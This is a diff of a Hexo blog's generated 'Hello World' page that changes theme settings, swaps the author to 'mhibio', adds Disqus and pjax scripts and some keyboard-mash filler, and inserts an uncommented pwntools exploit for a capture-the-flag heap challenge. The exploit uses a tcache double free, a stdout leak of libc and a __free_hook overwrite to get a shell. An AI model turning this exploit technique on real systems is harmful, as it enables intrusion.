@@ -24,9 +24,9 @@
     scheme: 'Gemini',
     version: '7.7.0',
     exturl: false,
-    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    sidebar: {"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":false,"style":"mac"},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
     bookmark: {"enable":false,"color":"#222","save":"auto"},
     fancybox: false,
     mediumzoom: false,
@@ -54,8 +54,8 @@
 <meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-01-29T17:46:08.727Z">
-<meta property="article:modified_time" content="2020-01-29T17:46:08.728Z">
-<meta property="article:author" content="John Doe">
+<meta property="article:modified_time" content="2020-01-29T20:43:22.055Z">
+<meta property="article:author" content="mhibio">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="http://yoursite.com/2020/01/30/hello-world/">
@@ -143,11 +143,6 @@
     <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
 
   </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">0</span></a>
-
-  </li>
         <li class="menu-item menu-item-categories">
 
     <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories<span class="badge">0</span></a>
@@ -158,21 +153,6 @@
     <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">1</span></a>
 
   </li>
-        <li class="menu-item menu-item-schedule">
-
-    <a href="/schedule/" rel="section"><i class="fa fa-fw fa-calendar"></i>Schedule</a>
-
-  </li>
-        <li class="menu-item menu-item-sitemap">
-
-    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>Sitemap</a>
-
-  </li>
-        <li class="menu-item menu-item-commonweal">
-
-    <a href="/404/" rel="section"><i class="fa fa-fw fa-heartbeat"></i>Commonweal 404</a>
-
-  </li>
   </ul>
 
 </nav>
@@ -180,10 +160,6 @@
     </header>
 
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
 
 
     <main class="main">
@@ -202,8 +178,8 @@
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/30/hello-world/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="mhibio">
       <meta itemprop="description" content="">
     </span>
 
@@ -221,11 +197,26 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2020-01-30 02:46:08" itemprop="dateCreated datePublished" datetime="2020-01-30T02:46:08+09:00">2020-01-30</time>
+              <time title="Created: 2020-01-30 02:46:08 / Modified: 05:43:22" itemprop="dateCreated datePublished" datetime="2020-01-30T02:46:08+09:00">2020-01-30</time>
             </span>
 
           
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2020/01/30/hello-world/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/01/30/hello-world/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
 
         </div>
       </header>
@@ -237,7 +228,7 @@
 
       
         <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+<h1 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h1><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size, pay)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'1'</span>)</span><br><span class="line">   sleep(<span class="number">0.3</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">':'</span>, str(idx))</span><br><span class="line">   sleep(<span class="number">0.3</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">':'</span>, str(size))</span><br><span class="line">   sleep(<span class="number">0.3</span>)</span><br><span class="line">   p.sendafter(<span class="string">':'</span>, pay)</span><br><span class="line">   sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'2'</span>)</span><br><span class="line">   sleep(<span class="number">0.3</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">':'</span>, str(idx))</span><br><span class="line">   sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'1337'</span>)   </span><br><span class="line">   sleep(<span class="number">0.3</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">':'</span>, str(idx))</span><br><span class="line">   sleep(<span class="number">0.3</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">':'</span>, str(size))</span><br><span class="line">   sleep(<span class="number">0.3</span>)   </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'challs.xmas.htsp.ro'</span>, <span class="number">12004</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x30</span>, (p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>))*<span class="number">3</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x80</span>, <span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x50</span>, <span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">   delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(3, 0x80, '\x60\x07\xdd')</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x80</span>, <span class="string">'\x60\xc7'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x30</span>, <span class="string">'\xa0'</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x30</span>, p64(<span class="number">0xfbad1800</span>)+<span class="string">'\x00'</span>*<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'libc_loading'</span>)</span><br><span class="line">libc = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00'</span>*<span class="number">2</span>)- <span class="number">0x3ed8b0</span></span><br><span class="line">log.info(hex(libc))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x50</span>, p64(libc+<span class="number">0x3ed8e8</span>))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x50</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x50</span>, p64(libc+<span class="number">0x4f440</span>))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
 <h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
@@ -248,6 +239,7 @@
 <p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
 <h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
+<p>asd<br>ddqw<br>d<br>qdw<br>wd<br>wd<br>qwd<br>wdq<br>qwd<br>qwd<br>qwd<br>qdw<br>dqw<br>dqw</p>
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
 
     </div>
@@ -274,6 +266,13 @@
 
           </div>
           
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -320,13 +319,15 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.0.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.0.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.0.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.0.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">John Doe</p>
+    <img class="site-author-image" itemprop="image" alt="mhibio"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">mhibio</p>
   <div class="site-description" itemprop="description"></div>
 </div>
 <div class="site-state-wrap motion-element">
@@ -340,10 +341,22 @@
       </div>
   </nav>
 </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mhibio" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mhibio" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/profile.php?id=100009396494932" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100009396494932" rel="noopener" target="_blank"><i class="fa fa-fw fa-facebook"></i>FB Page</a>
+      </span>
+  </div>
 
 
 
       </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
 
     </div>
   </aside>
@@ -362,9 +375,9 @@
   &copy; 
   <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
-    <i class="fa fa-user"></i>
+    <i class="fa fa-mhibio"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
+  <span class="author" itemprop="copyrightHolder">mhibio</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
   </div>
@@ -387,6 +400,7 @@
 
   
   <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
   <script src="/lib/velocity/velocity.min.js"></script>
   <script src="/lib/velocity/velocity.ui.min.js"></script>
 
@@ -400,6 +414,64 @@
 
 <script src="/js/next-boot.js"></script>
 
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.getAttribute('pjax') !== null) {
+      script.setAttribute('pjax', '');
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
 
 
 
@@ -419,9 +491,52 @@
 
 
 
+    <div id="pjax">
   
 
   
+  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
+  <script>
+      window.addEventListener('load', () => {
+      quicklink({
+        timeout: 3000,
+        priority: true,
+        ignores: [uri => uri.includes('#'),uri => uri == 'http://yoursite.com/2020/01/30/hello-world/',]
+      });
+      });
+  </script>
 
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://mhibio.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  var disqus_config = function() {
+    this.page.url = "http://yoursite.com/2020/01/30/hello-world/";
+    this.page.identifier = "2020/01/30/hello-world/";
+    this.page.title = "Hello World";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://mhibio.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+    </div>
 </body>
 </html>
